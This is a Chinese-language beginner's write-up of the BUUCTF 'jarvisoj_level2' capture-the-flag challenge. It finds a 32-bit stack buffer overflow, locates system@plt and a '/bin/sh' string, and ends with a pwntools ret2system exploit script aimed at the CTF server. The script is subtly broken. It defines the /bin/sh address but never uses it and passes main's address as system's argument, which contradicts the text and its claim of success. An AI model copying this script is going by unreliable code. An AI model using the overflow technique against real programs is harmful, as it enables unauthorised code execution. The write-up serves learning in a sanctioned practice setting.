[BUUCTF]jarvisoj_level2_writeup

**新手上路，欢迎交流指错**

哈哈哈哈哈哈，我终于弄懂怎么插入图片啦



首先checksec一下

<img width="257" height="90" alt="image" src="https://github.com/user-attachments/assets/712cd4d7-6ec8-4100-a49d-11c9d5d47d47" />

发现只开了NX（栈不可执行）那就应该考虑怎么构造攻击链

下一步打开IDA，看看main

<img width="635" height="317" alt="image" src="https://github.com/user-attachments/assets/a6c27015-6eeb-49fa-b29f-7ead8dbceaea" />


发现没什么特别的，那就先看看vulnerable_function()里面有没有什么漏洞


<img width="280" height="115" alt="image" src="https://github.com/user-attachments/assets/ddd98090-cb2c-4fdb-ac8f-c29b1c9068e2" />

发现了一个危险的read，读取了0x100（256B），但缓冲区大小是0x88（136B），存在缓冲区溢出

然后再用shift加F12看看有没有什么可用的字符串

<img width="253" height="163" alt="image" src="https://github.com/user-attachments/assets/267e3ba0-6781-4354-ad68-4c5f004b20c4" />

可以，收获颇丰，这样我们可以获得/bin/sh的地址

再看看旁边函数栏，发现了我们需要的system函数调用，也知道了其地址

<img width="877" height="274" alt="image" src="https://github.com/user-attachments/assets/bc38414c-1f56-4fc5-8553-8dfe04c80a02" />

其实仔细看的话好像是有两个system，而我们只需要那个.plt的就行，因为只有这个可以跳转到实际的可执行代码段（有plt就用plt，这样就不用找libc了）

<img width="253" height="190" alt="image" src="https://github.com/user-attachments/assets/c9df4391-22e8-4d45-9537-14ac639735ad" />

好，那么东西都齐了，开始写脚本
再啰嗦一些要点：32位程序的函数调用与64位不同，返回地址后面（高地址）应该先加上system返回地址（这里我直接把mian函数当返回地址了），然后才是第一位参数/bin/sh

```python
from pwn import *
r=remote("node5.buuoj.cn",25387)

system_addr=0x8048320
bin_sh_adr=0x0804A024
main_addr=0x804848e

payload=b"A"*140+p32(system_addr)+p32(main_addr)+p32(main_addr)
r.sendline(payload)

r.interactive()
```

成功拿下flag

<img width="432" height="97" alt="image" src="https://github.com/user-attachments/assets/621b5fa3-b98e-4fbd-af1c-c99f5e09a712" />

